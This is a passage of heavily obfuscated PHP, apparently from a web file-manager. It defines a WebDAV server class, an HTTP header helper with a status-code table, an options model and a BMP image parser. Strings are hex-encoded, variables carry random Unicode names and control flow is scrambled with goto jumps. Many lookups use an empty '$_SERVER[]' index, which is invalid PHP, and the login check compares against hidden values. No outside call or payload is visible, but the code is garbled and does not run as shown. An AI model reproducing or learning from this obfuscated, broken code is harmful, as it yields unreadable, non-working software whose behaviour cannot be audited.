isset($eʂ̘[$c݌ؿ[2501]]) ? $eʂ̘[$c݌ؿ[2501]] : 0, $c݌ؿ[688] => 0, $c݌ؿ[183] => 0); return parent::insert($Bژ); } public function userNoticeEdit($F涩, $c덚) { $this->initUserOption(); return parent::update($F涩, $c덚); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\155\137\157\160\x74\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\154\145", "\162\x6f\154\145\x47\x72\157\x75\160", "\x72\145\x67\151\x73\164", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($dŸբ) { return "\x53\x79\163\164\145\x6d\x4f\160\x74\x69\x6f\156\137{$dŸբ}"; } protected function optionDefault($f񅯈 = '') { $d𢸥 =& $_SERVER[]; if ($f񅯈 == $d𢸥[33]) { return $GLOBALS[$d𢸥[6]][$d𢸥[2502]]; } } } goto Dȿ; e悸͎: class HttpDavServer { public function __construct($aꎤ, $dĽ) { $this->root = $aꎤ; $this->initPath($dĽ); $this->start(); } public function initPath($Bˌ) { $Fۤȏਇ =& $_SERVER[]; $FÄ = rtrim($_SERVER[$Fۤȏਇ[1388]], $Fۤȏਇ[8]) . $Fۤȏਇ[8]; $this->urlBase = substr($FÄ, 0, strpos($FÄ, $Bˌ) + 1); $this->urlBase = rtrim($this->urlBase, $Fۤȏਇ[8]) . $Bˌ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $a =& $_SERVER[]; $bп = HttpAuth::get(); if ($bп[$a[537]] == $a[1785] && $bп[$a[898]] == $a[1786]) { return !0; } HttpAuth::error(); } public function start() { goto Eن; A霃: if (!$b) { return; } self::response($b); goto B; a܋᤽: if (!method_exists($this, $aǺ)) { pr($aǺ . $a̴[1787]); die; } $c䇿 = array($a̴[1788], $a̴[1789]); if (!in_array($aǺ, $c䇿) && !$this->pathExists($this->path)) { $b = array($a̴[1034] => 404); } else { $b = $this->{$aǺ}(); } goto A霃; Eن: $a̴ =& $_SERVER[]; $this->checkUser(); $aǺ = $a̴[144] . HttpHeader::method(); goto a܋᤽; B: } public function pathGet($c = false) { $EȺ =& $_SERVER[]; $b令 = $c ? $_SERVER[$EȺ[1790]] : $_SERVER[$EȺ[1388]]; $b令 = KodIO::clear(rawurldecode($b令)); if (!strstr($b令, KodIO::clear($this->urlBase))) { return !1; } return substr($b令, strpos($b令, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($E) { return file_exists($E); } public function pathMkdir($fѕȬ) { return mkdir($fѕȬ, 511, !0); } public function pathInfo($c㖪ާ) { return path_info($c㖪ާ); } public function pathList($a☇) { return path_list($a☇); } public function pathOut($Eڽ) { echo file_get_contents($Eڽ); } public function pathPut($cɦ, $d֒ = '') { if (!$d֒) { return file_put_contents($cɦ, $_SERVER[][33]); } return move_path($d֒, $cɦ); } public function pathRemove($bǋ) { if (is_file($bǋ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($dѣ, $Eʷ) { return move_path($dѣ, $Eʷ); } public function pathCopy($DùË, $FՇݺ) { return copy_dir($DùË, $FՇݺ); } public function parsePath($cۢ텄) { return $cۢ텄; } public function parseItem($e, $b禳) { goto aϹŭ; a: if ($b禳) { $a = $Aѵ[8] . str_replace($Aѵ[172], $Aѵ[8], rawurlencode($this->pathGet())); } if (!trim($e[$Aѵ[107]])) { $e[$Aѵ[107]] = time(); } if (!trim($e[$Aѵ[187]])) { $e[$Aѵ[187]] = time(); } goto Aϥ; Aϥ: $f = array($Aѵ[1791] => KodIO::clear($this->urlBase . $a), $Aѵ[107] => @gmdate($Aѵ[1792], $e[$Aѵ[107]]), $Aѵ[187] => @gmdate($Aѵ[1793], $e[$Aѵ[187]]), $Aѵ[77] => $e[$Aѵ[77]] ? $e[$Aѵ[77]] : 0); return $f; goto fԳ; aϹŭ: $Aѵ =& $_SERVER[]; $a = $this->pathGet() . $Aѵ[8] . $e[$Aѵ[28]]; $a = $Aѵ[8] . str_replace($Aѵ[172], $Aѵ[8], rawurlencode($a)); goto a; fԳ: } public function parseItemXml($bޔ, $A) { $fЍ =& $_SERVER[]; $cá = $this->parseItem($bޔ, $A); if ($bޔ[$fЍ[29]] == $fЍ[76]) { $F = $fЍ[1794]; $F .= $fЍ[1795]; } else { $f = $bޔ[$fЍ[160]] ? $bޔ[$fЍ[160]] : get_path_ext($bޔ[$fЍ[28]]); $dÌ = get_file_mime($f); $F = $fЍ[1796]; $F .= "\74\104\72\x67\x65\164\x63\157\156\164\x65\156\164\164\171\160\145\x3e{$dÌ}\x3c\x2f\104\x3a\147\x65\164\143\x6f\156\164\x65\156\164\164\171\160\x65\x3e"; } return "\xa\x9\x9\x3c\104\72\162\145\x73\x70\157\156\163\x65\76\12\11\x9\11\74\x44\x3a\x68\162\145\x66\76{$cá[$fЍ[1791]]}\74\x2f\x44\x3a\150\x72\x65\146\76\xa\x9\x9\11\x3c\104\x3a\160\162\x6f\x70\x73\x74\141\x74\76\12\x9\11\x9\x9\74\x44\72\x70\162\157\x70\76\xa\11\11\x9\x9\x9\x3c\x44\72\147\145\x74\154\x61\163\x74\155\x6f\144\151\146\151\x65\144\x3e{$cá[$fЍ[107]]}\x3c\57\x44\72\147\145\164\154\x61\x73\164\x6d\x6f\x64\151\x66\x69\145\144\76\12\11\11\x9\11\11\x3c\x44\72\143\162\x65\x61\x74\x69\x6f\156\x64\141\x74\x65\x3e{$cá[$fЍ[187]]}\x3c\57\104\x3a\x63\x72\x65\x61\164\x69\x6f\x6e\x64\x61\164\x65\76\12\11\11\11\x9\11\x3c\104\x3a\x67\145\x74\143\x6f\156\x74\x65\156\x74\154\145\156\147\164\150\x3e{$cá[$fЍ[77]]}\x3c\57\x44\x3a\147\145\x74\143\157\x6e\164\145\156\164\154\x65\156\x67\x74\150\76\xa\11\x9\11\x9\x9{$F}\xa\11\11\11\x9\x3c\57\104\x3a\160\162\x6f\160\76\12\x9\11\x9\11\x3c\104\72\x73\x74\x61\x74\165\x73\76\110\x54\x54\120\x2f\x31\56\x31\x20\x32\60\60\x20\x4f\x4b\x3c\57\x44\72\163\164\x61\x74\165\x73\x3e\xa\x9\x9\x9\74\57\104\x3a\x70\x72\157\x70\x73\x74\141\164\x3e\xa\x9\x9\74\x2f\104\x3a\x72\x65\x73\160\x6f\156\x73\x65\76"; } public function pathListMerge($b) { goto b; b: $bؚν =& $_SERVER[]; if (!$b) { return $b; } $c鲦 = array($bؚν[73], $bؚν[74], $bؚν[1797]); goto E; E: $a˦ = array(); foreach ($b as $Fꂂ => $C) { if (!in_array($Fꂂ, $c鲦) || !is_array($C)) { continue; } $a˦ = array_merge($a˦, $C); } foreach ($a˦ as &$Cɝ) { $Cɝ[$bؚν[28]] = str_replace($bؚν[8], $bؚν[1390], $Cɝ[$bؚν[28]]); } goto cЙ; cЙ: return $a˦; goto a; a: } public function httpPROPFIND() { goto c۸; E: if ($Aʇ) { $D򗑅 = array($Eō޴); } else { $Eō޴[$A[28]] = $A[33]; $D򗑅 = array_merge(array($Eō޴), $D򗑅); } $AĐ = $A[33]; foreach ($D򗑅 as $D҂) { $AĐ .= $this->parseItemXml($D҂, $Aʇ); } goto Aʪ; c۸: $A =& $_SERVER[]; $f๜ = $this->pathList($this->path); $D򗑅 = $this->pathListMerge($f๜); goto f羉; Aʪ: return array($A[1800] => 207, $A[1801] => "\x3c\104\x3a\x6d\x75\x6c\164\151\x73\164\x61\164\165\163\40\x78\x6d\154\x6e\x73\x3a\x44\x3d\x22\x44\101\126\x3a\x22\x3e\12{$AĐ}\12\x3c\57\104\72\155\165\154\x74\x69\x73\x74\x61\164\x75\x73\x3e"); goto F; f羉: $Eō޴ = $f๜[$A[1798]]; if (!is_array($D򗑅) || $Eō޴[$A[1799]] === !1) { return array($A[1800] => 404, $A[1801] => $A[1802]); } $Aʇ = $Eō޴[$A[29]] == $A[167] || HttpHeader::get($A[1777]) == $A[470]; goto E; F: } public function httpHEAD() { $B４ =& $_SERVER[]; $c؆ = $this->pathInfo($this->path); if (!$c؆ || $c؆[$B４[29]] == $B４[76]) { return array($B４[1034] => 200, $B４[1209] => array($B４[1803])); } return array($B４[1034] => 200, $B４[1209] => array($B４[1804], $B４[136], $B４[1805] . $c؆[$B４[77]], $B４[1806] . get_file_mime($c؆[$B４[160]]), $B４[132] . gmdate($B４[1792], $c؆[$B４[1256]]) . $B４[1807], $B４[1808])); } public function httpOPTIONS() { $aڕ =& $_SERVER[]; return array($aڕ[1034] => 200, $aڕ[1209] => array($aڕ[1809], $aڕ[1810], $aڕ[1811], $aڕ[1265])); } public function httpPROPPATCH() { $eھȓ =& $_SERVER[]; $A = $eھȓ[1812] . $_SERVER[$eھȓ[1388]] . $eھȓ[1813]; return array($eھȓ[1800] => 207, $eھȓ[1801] => "\74\x44\x3a\155\165\154\x74\151\x73\164\x61\x74\x75\163\x20\x78\x6d\x6c\156\163\72\x44\x3d\42\104\x41\126\72\42\76\xa{$A}\xa\74\x2f\x44\72\155\165\154\164\x69\163\x74\141\x74\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $e =& $_SERVER[]; $Eւ = $this->uploadFile(); if ($Eւ) { $Fܣ = 204; } else { $Eւ = $e[33]; $Fܣ = 201; } $b = $this->pathPut($this->path, $Eւ); if ($b == !1) { $Fܣ = 404; } return array($e[1800] => $Fܣ); } private function uploadFile() { goto a; F¿: $c = @fopen($Aؓ, $A٦[1522]); $aЈ = @fopen($A٦[1815], $A٦[1521]); if (!$aЈ || !$c) { @unlink($Aؓ); return !1; } goto Dꉐ; Dꉐ: while (!feof($aЈ)) { fwrite($c, fread($aЈ, 1024 * 200)); } fclose($aЈ); fclose($c); goto Aċ; Aċ: if (@filesize($Aؓ) > 0) { return $Aؓ; } @unlink($Aؓ); return !1; goto AĴæ; a: $A٦ =& $_SERVER[]; @mk_dir(TEMP_FILES); $Aؓ = TEMP_FILES . $A٦[1814] . rand_string(32); goto F¿; AĴæ: } public function httpMKCOL() { $e =& $_SERVER[]; if ($this->pathExists($this->path)) { return array($e[1034] => 409); } $e = $this->pathMkdir($this->path); return array($e[1034] => $e ? 201 : 403); } public function httpMOVE() { $Aј񤧰 =& $_SERVER[]; $Bܰ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Aј񤧰[1816]])) { $e[$Aј񤧰[1817]] = $_SERVER[$Aј񤧰[1816]] == $Aј񤧰[1818]; } $F = $this->pathMove($this->path, $Bܰ); return array($Aј񤧰[1034] => $F ? 201 : 404); } public function httpCOPY() { $Bɺ = $this->parsePath($this->pathGet(!0)); $B = $this->pathCopy($this->path, $Bɺ); return array($_SERVER[][1034] => $B ? 201 : 404); } public function httpDELETE() { $Dڷ = $this->pathRemove($this->path); return array($_SERVER[][1034] => $Dڷ ? 200 : 503); } public function httpLOCK() { $Bɱ =& $_SERVER[]; $Cܺİ = md5($this->path); $bϝ = $Bɱ[1819] . $this->xmlGet($Bɱ[1820]) . $Bɱ[1821] . $Cܺİ . $Bɱ[1822]; return array($Bɱ[1034] => 200, $Bɱ[1209] => array($Bɱ[1823] . $Cܺİ, $Bɱ[1824]), $Bɱ[1825] => $bϝ); } public function httpUNLOCK() { return array($_SERVER[][1034] => 204); } public function xmlGet($Eʊ) { goto dɏ; B˓: if ($B) { return $B[0]->nodeValue; } return $FȊ񿉋[33]; goto a׋; A⨱: $c = explode($FȊ񿉋[8], $Eʊ); $b؏Ȍۊ = array_shift($c); $B = $A؛->getElementsByTagNameNS($FȊ񿉋[1827], $b؏Ȍۊ); goto B˓; dɏ: $FȊ񿉋 =& $_SERVER[]; static $A؛ = false; if (!$A؛) { $eܜ = file_get_contents($FȊ񿉋[1826]); $A؛ = new DOMDocument(); $A؛->loadXML($eܜ); } goto A⨱; a׋: } public static function response($f) { goto CՍ܆; Eݎ: if (is_string($f[$cƒ[1825]])) { header($cƒ[1828]); $A虵 = $cƒ[1829] . $cƒ[217] . $f[$cƒ[1825]]; echo $A虵; } goto a綴; CՍ܆: $cƒ =& $_SERVER[]; $aޙ = is_array($f[$cƒ[1209]]) ? $f[$cƒ[1209]] : array(); $aޙ[] = HttpHeader::code($f[$cƒ[1034]]); goto d; d: $aޙ[] = $cƒ[1767]; $aޙ[] = $cƒ[1768]; foreach ($aޙ as $B핚) { header($B핚); } goto Eݎ; a綴: } } class HttpHeader { public static $_headers = array("\110\157\x73\x74" => "\110\x54\x54\120\x5f\110\x4f\x53\124", "\125\x73\145\x72\55\101\x67\x65\x6e\164" => "\x48\x54\x54\x50\x5f\125\123\x45\122\137\101\x47\x45\116\x54", "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65" => "\110\x54\x54\x50\x5f\x43\x4f\x4e\124\105\116\x54\x5f\x54\131\120\105", "\103\157\x6e\x74\145\156\164\55\114\145\156\x67\164\150" => "\x48\124\x54\120\x5f\103\117\x4e\x54\105\x4e\x54\137\114\105\x4e\107\124\x48", "\104\x65\x70\164\x68" => "\x48\x54\x54\120\137\104\x45\120\124\110", "\105\170\160\x65\143\x74" => "\110\x54\124\120\137\x45\130\x50\x45\x43\x54", "\111\146\55\116\157\x6e\145\x2d\x4d\141\x74\x63\150" => "\x48\x54\124\120\x5f\x49\x46\x5f\x4e\117\x4e\x45\x5f\x4d\101\x54\x43\x48", "\111\x66\x2d\115\141\x74\x63\x68" => "\x48\124\124\120\137\x49\106\x5f\115\101\x54\x43\110", "\111\x66\x2d\122\141\x6e\x67\x65" => "\x48\124\x54\x50\x5f\111\x46\x5f\122\x41\116\x47\x45", "\114\x61\163\164\x2d\115\x6f\x64\151\146\x69\x65\144" => "\110\124\x54\120\137\x4c\x41\x53\x54\137\115\117\104\111\x46\x49\x45\104", "\111\146\x2d\x4d\x6f\144\x69\146\x69\145\x64\x2d\123\x69\156\143\x65" => "\x48\x54\x54\120\x5f\x49\106\137\x4d\117\104\x49\106\x49\x45\104\x5f\x53\x49\x4e\103\105", "\x49\146\x2d\125\x6e\x6d\x6f\x64\151\x66\x69\145\144\55\x53\x69\x6e\143\145" => "\x48\124\x54\120\137\111\x46\137\x55\x4e\x4d\117\104\x49\x46\111\x45\x44\137\123\111\x4e\103\105", "\x52\141\156\x67\x65" => "\110\x54\x54\x50\137\122\101\116\x47\x45", "\124\151\155\x65\x6f\x75\164" => "\x48\124\124\x50\137\x54\111\115\105\x4f\125\124", "\111\146" => "\x48\x54\x54\120\x5f\x49\106", "\114\157\x63\153\55\x54\x6f\x6b\145\x6e" => "\110\x54\124\120\137\x4c\x4f\x43\113\x5f\124\117\x4b\105\116", "\x4f\x76\x65\162\x77\162\x69\x74\145" => "\110\124\124\x50\x5f\117\126\x45\x52\127\x52\x49\124\x45", "\x44\145\163\x74\x69\x6e\x61\x74\x69\157\x6e" => "\x48\124\x54\x50\x5f\104\105\x53\x54\111\116\101\x54\111\x4f\x4e", "\122\x65\161\165\145\x73\164\x2d\x49\x64" => "\x52\x45\x51\x55\105\x53\x54\x5f\111\104", "\x52\145\161\165\x65\163\164\x2d\102\x6f\x64\x79\x2d\x46\151\154\x65" => "\122\x45\121\x55\105\x53\124\137\102\117\x44\131\137\x46\111\114\x45", "\x52\145\x64\x69\162\x65\x63\x74\55\x53\164\141\164\x75\x73" => "\122\x45\x44\x49\x52\x45\x43\124\x5f\x53\124\x41\124\125\x53"); public static function init() { static $A = false; if ($A) { return; } foreach ($_SERVER as $F땬 => $f˙ބ) { $F땬 = strtoupper($F땬); if (!array_key_exists($F땬, $_SERVER)) { continue; } $_SERVER[$F땬] = $f˙ބ; } foreach (self::$_headers as $F땬 => $eѻ) { if (!array_key_exists($F땬, $_SERVER)) { continue; } $_SERVER[$F땬] = $_SERVER[$eѻ]; $_SERVER[strtoupper($F땬)] = $_SERVER[$eѻ]; } } public static function get($D۳듑) { self::init(); return $_SERVER[$D۳듑] ? $_SERVER[$D۳듑] : $_SERVER[$_SERVER[][1830] . strtoupper($D۳듑)]; } public static function method() { return strtoupper(self::get($_SERVER[][154])); } public static function length() { $a =& $_SERVER[]; $dɑ = self::get($a[1831]); if (!$dɑ) { $dɑ = self::get($a[1148]); } return $dɑ; } public static function range() { $a =& $_SERVER[]; $FǍ = self::get($a[198]); if (!$FǍ) { return !1; } if (!preg_match($a[1832], $FǍ, $A샧؃)) { return !1; } if ($A샧؃[1] === $a[33] && $A샧؃[2] === $a[33]) { return !1; } return array($A샧؃[1] !== $a[33] ? $A샧؃[1] : null, $A샧؃[2] !== $a[33] ? $A샧؃[2] : null); } public static $statusCode = array("\61\60\60" => "\103\x6f\x6e\164\151\x6e\165\x65", "\61\60\61" => "\123\167\x69\164\x63\150\x69\x6e\x67\x20\x50\x72\x6f\x74\x6f\x63\157\x6c", "\x31\60\62" => "\120\x72\157\143\145\x73\163\x69\x6e\147", "\61\60\x33" => "\105\x61\x72\x6c\171\40\110\x69\156\164\x73", "\x32\60\x30" => "\117\113", "\x32\60\61" => "\x43\162\145\141\x74\x65\x64", "\62\60\x32" => "\101\143\143\x65\x70\x74\145\144", "\62\x30\63" => "\116\157\156\55\x41\x75\164\x68\157\162\151\164\141\x74\x69\166\145\40\111\x6e\146\x6f\x72\155\141\x74\x69\x6f\156", "\62\60\64" => "\116\157\40\103\x6f\x6e\x74\145\156\x74", "\62\60\x35" => "\x52\x65\163\145\164\x20\x43\x6f\156\164\x65\x6e\x74", "\62\x30\x36" => "\x50\x61\162\164\x69\141\x6c\40\103\157\x6e\x74\145\156\x74", "\x32\60\x37" => "\115\x75\154\x74\x69\55\123\164\x61\164\165\x73", "\x33\60\60" => "\x4d\165\x6c\164\151\x70\154\x65\x20\103\150\157\x69\x63\145\163", "\x33\60\x31" => "\115\x6f\x76\145\144\x20\x50\145\162\x6d\x61\x6e\145\156\x74\154\171", "\x33\60\x32" => "\x46\x6f\x75\156\144", "\63\x30\63" => "\123\x65\145\x20\x4f\x74\150\x65\162", "\63\x30\64" => "\x4e\157\164\40\115\157\x64\151\146\151\145\144", "\x33\60\65" => "\x55\163\145\x20\120\162\157\x78\x79", "\x33\60\x37" => "\124\x65\155\x70\x6f\x72\x61\162\171\x20\122\145\x64\151\x72\x65\143\x74", "\63\x30\x38" => "\x50\145\x72\x6d\x61\156\x65\x6e\x74\x20\122\x65\144\x69\162\x65\143\x74", "\64\60\60" => "\x42\141\144\x20\122\x65\x71\165\145\163\164", "\x34\60\61" => "\x55\x6e\x61\x75\164\x68\x6f\162\151\x7a\145\144", "\64\60\x32" => "\x50\141\171\x6d\x65\x6e\164\x20\122\145\161\x75\151\162\145\x64", "\x34\x30\x33" => "\x46\x6f\162\142\151\x64\144\x65\156", "\64\60\x34" => "\116\x6f\x74\x20\106\157\165\x6e\144", "\64\60\65" => "\115\x65\x74\150\157\144\x20\116\x6f\164\x20\101\154\x6c\157\x77\x65\x64", "\64\x30\66" => "\116\157\164\x20\x41\143\x63\x65\160\x74\x61\142\x6c\145", "\x34\60\x37" => "\x50\x72\x6f\170\x79\x20\101\x75\x74\150\x65\x6e\x74\x69\143\x61\164\151\157\x6e\x20\x52\x65\161\x75\x69\162\145\144", "\x34\60\70" => "\122\145\x71\x75\145\163\164\40\124\x69\x6d\145\157\x75\164", "\x34\x30\x39" => "\103\x6f\156\x66\x6c\151\143\164", "\x34\x31\x30" => "\x47\x6f\156\x65", "\64\61\x31" => "\114\145\156\147\x74\x68\x20\122\x65\x71\165\151\x72\145\144", "\x34\61\x32" => "\120\x72\x65\143\157\156\x64\x69\164\151\157\x6e\x20\106\141\151\x6c\145\144", "\x34\x31\x33" => "\122\145\161\x75\145\x73\x74\40\x45\x6e\x74\x69\164\171\x20\124\157\x6f\x20\114\141\162\147\x65", "\x34\x31\x34" => "\122\x65\161\x75\145\x73\x74\x20\125\x52\x49\40\124\x6f\157\40\114\x61\x72\147\x65", "\64\61\65" => "\x55\x6e\x73\x75\160\160\157\162\x74\x65\144\x20\x4d\145\x64\151\141\40\124\171\160\x65", "\64\61\x36" => "\x52\x65\161\x75\x65\x73\x74\x65\x64\40\122\141\x6e\147\x65\x20\x4e\x6f\x74\40\123\141\164\151\163\146\151\x61\x62\x6c\145", "\x34\x31\67" => "\x45\x78\x70\x65\x63\x74\141\x74\x69\157\x6e\40\x46\x61\151\154\x65\144", "\64\62\62" => "\125\x6e\160\x72\x6f\143\145\x73\x73\x61\x62\x6c\x65\40\x45\156\x74\x69\x74\171", "\64\x32\x33" => "\114\x6f\x63\x6b\145\144", "\64\62\x34" => "\x46\141\151\154\145\144\x20\x44\145\160\x65\156\x64\145\156\x63\171", "\x34\62\x35" => "\x55\x6e\x6f\x72\x64\145\162\x65\144\x20\x43\157\154\154\x65\143\x74\x69\x6f\x6e", "\64\62\x36" => "\x55\160\x67\162\x61\x64\145\x20\122\x65\161\165\151\x72\145\x64", "\x34\62\x38" => "\x50\162\145\x63\x6f\156\144\x69\164\x69\x6f\x6e\x20\x52\x65\161\x75\x69\x72\145\144", "\x34\62\x39" => "\x54\157\x6f\x20\x4d\x61\x6e\171\x20\122\145\161\165\145\x73\164\163", "\x34\x33\x31" => "\x52\x65\161\165\x65\163\x74\40\x48\145\141\144\145\x72\40\106\151\x65\x6c\x64\163\40\x54\157\x6f\x20\114\141\162\147\x65", "\64\64\x34" => "\116\x6f\40\122\x65\163\160\x6f\156\x73\145", "\x34\x35\60" => "\x42\x6c\157\143\x6b\x65\144\40\x62\171\x20\127\x69\x6e\x64\x6f\167\163\40\120\x61\x72\x65\x6e\164\x61\154\x20\103\x6f\156\x74\x72\157\154\163", "\x34\x35\61" => "\x55\156\141\x76\141\x69\x6c\141\x62\154\x65\x20\106\x6f\x72\40\114\x65\147\x61\x6c\x20\x52\145\141\x73\x6f\156\163", "\x34\x39\x34" => "\122\145\x71\165\145\163\x74\40\110\145\x61\x64\145\x72\40\x54\x6f\157\x20\114\141\x72\x67\145", "\65\60\60" => "\111\x6e\164\145\x72\156\141\154\x20\123\x65\162\166\145\162\x20\105\162\x72\x6f\x72", "\x35\x30\61" => "\116\157\164\x20\x49\x6d\160\154\x65\155\x65\x6e\x74\145\x64", "\x35\60\x32" => "\102\141\x64\x20\107\x61\164\145\x77\141\x79", "\65\60\63" => "\x53\x65\162\166\151\x63\145\x20\x55\156\141\x76\x61\x69\154\x61\x62\x6c\x65", "\x35\60\64" => "\107\x61\164\145\167\x61\171\x20\x54\x69\x6d\x65\x6f\165\164", "\65\60\65" => "\x48\124\x54\x50\40\x56\x65\162\x73\x69\157\156\40\156\x6f\x74\40\x73\x75\x70\x70\157\x72\x74\145\144", "\65\x30\67" => "\x49\156\x73\x75\x66\x66\x69\143\151\145\156\164\x20\x53\164\x6f\162\141\147\x65"); public static function code($Eᔰ) { $b =& $_SERVER[]; $Eᔰ = $Eᔰ . $b[33]; $e = self::$statusCode[$Eᔰ]; $e = $e ? "\x48\124\124\x50\x2f\x31\56\x31\40{$Eᔰ}\40" . $e : $b[33]; return $e; } } class ImageGdBMP { public static function load($Dӧ) { $e = fopen($Dӧ, $_SERVER[][1521]); if ($e === !1) { return !1; } $C = self::loadFromStream($e); fclose($e); return $C; } public static function loadFromStream($Bϰ) { $D =& $_SERVER[]; $fޛ = fread($Bϰ, 14); if ($fޛ === !1) { return !1; } if ($fޛ[0] != $D[1833] || $fޛ[1] != $D[1834]) { return !1; } $fӞ = unpack($D[1835] . $D[1836] . $D[1837] . $D[1838] . $D[1839], $fޛ); return self::loadFromStreamAndFileHeader($Bϰ, $fӞ); } public static function loadFromStreamAndFileHeader($B񃢏, array $BѼϊ) { goto Fؑ; FÅ͌: if ($eٰ === !1) { return !1; } list(, $f) = unpack($Bʆ[1840], $eٰ); if ($f == 12) { goto Cͣ䏷; b: $c黻 = $c˩ = $CĄ = $c = 0; $Eȡ = 16711680; $EڕՅ = 65280; goto b; b: $Fߵ = 255; goto Bі; Cͣ䏷: $eٰ = fread($B񃢏, $f - 4); if ($eٰ === !1) { return !1; } extract(unpack($Bʆ[1841] . $Bʆ[1842] . $Bʆ[1843] . $Bʆ[1844], $eٰ)); goto b; Bі: } else { if (124 < $f || $f < 40) { return !1; } else { goto E; c: if (($c == 16 || $c == 24 || $c == 32) && $c == 0 && $Eȡ == 0 && $EڕՅ == 0 && $Fߵ == 0) { switch ($c) { case 16: $Eȡ = 31744; $EڕՅ = 992; $Fߵ = 31; break; case 24: case 32: $Eȡ = 16711680; $EڕՅ = 65280; $Fߵ = 255; break; } } goto d܄ґ; E: $eٰ = fread($B񃢏, 36); if ($eٰ === !1) { return !1; } extract(unpack($Bʆ[1845] . $Bʆ[1846] . $Bʆ[1843] . $Bʆ[1847] . $Bʆ[1848] . $Bʆ[1849] . $Bʆ[1850] . $Bʆ[1851] . $Bʆ[1852] . $Bʆ[1853], $eٰ)); goto C; C: if ($Bٻ & 2147483648) { $Bٻ = -(~$Bٻ & 4294967295) - 1; } if ($d͹ώ & 2147483648) { $d͹ώ = -(~$d͹ώ & 4294967295) - 1; } if ($C & 2147483648) { $C = -(~$C & 4294967295) - 1; } goto d; d: if ($cՠ & 2147483648) { $cՠ = -(~$cՠ & 4294967295) - 1; } if ($BѼϊ[$Bʆ[522]] != 0) { $d = $c == 1 || $c == 4 || $c == 8 ? ($c黻 ? $c黻 : pow(2, $c)) << 2 : 0; $b݌ = $aܬߛ ? $aܬߛ : ($Bٻ * $c + 31 >> 3 & ~3) * abs($d͹ώ); $B = $BѼϊ[$Bʆ[522]] - $b݌ - $d - 14; if ($f < $B && 40 <= $f && $f <= 124) { $f = $B; } } if ($f - 40 > 0) { $eٰ = fread($B񃢏, $f - 40); if ($eٰ === !1) { return !1; } extract(unpack($Bʆ[1854] . $Bʆ[1855] . $Bʆ[1856] . $Bʆ[1857], $eٰ . str_repeat($Bʆ[1858], 120))); } else { $CĄ = $Eȡ = $EڕՅ = $Fߵ = 0; } goto c; d܄ґ: } } goto b꼮; Fؑ: $Bʆ =& $_SERVER[]; if ($BѼϊ[$Bʆ[388]] != 19778) { return !1; } $eٰ = fread($B񃢏, 4); goto FÅ͌; Eӎ: $FȊ = abs($d͹ώ); $cխ = $d͹ώ > 0 ? $FȊ - 1 : 0; $E՗ = $d͹ώ > 0 ? -1 : 1; goto D޻ħ; D޻ħ: if ($c == 1 || $c == 4 || $c == 8) { goto F堜; F堜: $b = imagecreate($Bٻ, $FȊ); $D䣦 = $f == 12 ? 3 : 4; $A = $c黻 ? $c黻 : pow(2, $c); goto dﰪ; dﰪ: $Eۇ = array(); for ($fʆͬ = 0; $fʆͬ < $A; ++$fʆͬ) { $eٰ = fread($B񃢏, $D䣦); if ($eٰ === !1) { imagedestroy($b); return !1; } extract(unpack($Bʆ[1859], $eٰ . $Bʆ[1858])); $Eۇ[] = imagecolorallocate($b, $Cְ̻؝, $Aȼѭ, $Bܒ); } $E׏ = 8 - $c; goto f; f: $eі = (1 << $c) - 1 << $E׏; if ($c == 1 || $c == 2) { $B = 0; $b = $c >> 2 & 1; for (;;) { if ($B < -1 || $B > $Bٻ || $cխ < -1 || $cխ > $d͹ώ) { imagedestroy($b); return !1; } $eٰ = fread($B񃢏, 1); if ($eٰ === !1) { imagedestroy($b); return !1; } switch ($eٰ) { case $Bʆ[1858]: $eٰ = fread($B񃢏, 1); if ($eٰ === !1) { imagedestroy($b); return !1; } switch ($eٰ) { case $Bʆ[1858]: $cխ += $E՗; $B = 0; break; case $Bʆ[1860]: $cխ = 0; $B = 0; break 3; case $Bʆ[1861]: $eٰ = fread($B񃢏, 2); if ($eٰ === !1) { imagedestroy($b); return !1; } list(, $A, $c뎝) = unpack($Bʆ[1862], $eٰ); $B += $A; $cխ += $c뎝 * $E՗; break; default: list(, $D) = unpack($Bʆ[1863], $eٰ); $f = ($D >> $b) + ($D & $b); $eٰ = fread($B񃢏, $f + 1 & ~1); if ($eٰ === !1) { imagedestroy($b); return !1; } for ($fʆͬ = 0, $f = 0; $fʆͬ < $D; ++$fʆͬ, ++$B, $f += $c) { list(, $F) = unpack($Bʆ[1863], $eٰ[$f >> 3]); $Bܒ = $f & 7; imagesetpixel($b, $B, $cխ, $Eۇ[($F & $eі >> $Bܒ) >> $E׏ - $Bܒ]); } break; } break; default: $f֑՜ = fread($B񃢏, 1); if ($f֑՜ === !1) { imagedestroy($b); return !1; } list(, $C, $F) = unpack($Bʆ[1862], $eٰ . $f֑՜); for ($fʆͬ = 0, $f = 0; $fʆͬ < $C; ++$fʆͬ, ++$B, $f += $c) { $Bܒ = $f & 7; imagesetpixel($b, $B, $cխ, $Eۇ[($F & $eі >> $Bܒ) >> $E׏ - $Bܒ]); } break; } } } else { for ($EӨѯ = 0; $EӨѯ < $FȊ; ++$EӨѯ, $cխ += $E՗) { $eٰ = fread($B񃢏, $A); if ($eٰ === !1) { imagedestroy($b); return !1; } $f = 0; for ($B = 0; $B < $Bٻ; ++$B, $f += $c) { list(, $F) = unpack($Bʆ[1863], $eٰ[$f >> 3]); $Bܒ = $f & 7; imagesetpixel($b, $B, $cխ, $Eۇ[($F & $eі >> $Bܒ) >> $E׏ - $Bܒ]); } } } goto B١; B١: } else { goto b; b: $b = imagecreatetruecolor($Bٻ, $FȊ); imagealphablending($b, !1); if ($CĄ) { imagesavealpha($b, !0); } goto E䓱܂; E䓱܂: $C = $c >> 3; $e = $CĄ ? 127 : 0; $B = $CĄ ? 1 / $CĄ : 1; goto b僊; B򌄪: for ($EӨѯ = 0; $EӨѯ < $FȊ; ++$EӨѯ, $cխ += $E՗) { $eٰ = fread($B񃢏, $A); if ($eٰ === !1) { imagedestroy($b); return !1; } $f = 0; for ($B = 0; $B < $Bٻ; ++$B, $f += $C) { list(, $F) = unpack($Bʆ[1840], substr($eٰ, $f, $C) . $Bʆ[1864]); $D = $F & $CĄ; 